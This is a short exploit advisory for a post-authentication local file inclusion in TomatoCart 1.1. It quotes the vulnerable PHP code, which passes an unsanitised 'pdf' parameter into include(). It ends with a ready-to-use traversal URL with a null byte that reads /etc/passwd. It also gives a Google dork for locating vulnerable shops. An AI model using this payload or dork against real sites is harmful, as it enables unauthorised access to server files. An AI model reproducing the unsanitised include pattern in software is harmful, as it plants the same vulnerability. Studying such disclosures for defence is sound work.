@@ -1,0 +1,40 @@
+# Exploit Title: TomatoCart 1.1 PostAuth Local File Include
+# Google Dork: "Powered by TomatoCart"
+# Date: 25.10.2010
+# Author: brain[pillow]
+# Software Link: http://www.tomatocart.com/
+# Version: 1.1
+
+=========================================================
+# Vuln. code:
+
+ if ($osC_Customer->isLoggedOn() === true) { 
+   
+    if (isset($_REQUEST['module'])) { 
+      $module = $_REQUEST['module']; 
+      $osC_Language->load($module); 
+    }  
+     
+    if (isset($_REQUEST['pdf'])) { 
+      $pdf = $_REQUEST['pdf']; 
+    }  
+     
+    if (!empty($module) && !empty($pdf)) { 
+
+   
+      if (file_exists('includes/modules/pdf/' . $pdf . '.php')) { 
+        include('includes/modules/pdf/' . $pdf . '.php'); 
+         
+        $pdf_class = 'toC_' .ucfirst($pdf) . '_PDF'; 
+        $object = new $pdf_class(); 
+        $object ->render(); 
+         
+        exit; 
+      } 
+    } 
+  } 
+
+=========================================================
+# Exploit:
+
+/pdf.php?module=1&pdf=../../../../../../../../../../../../../etc/passwd%00
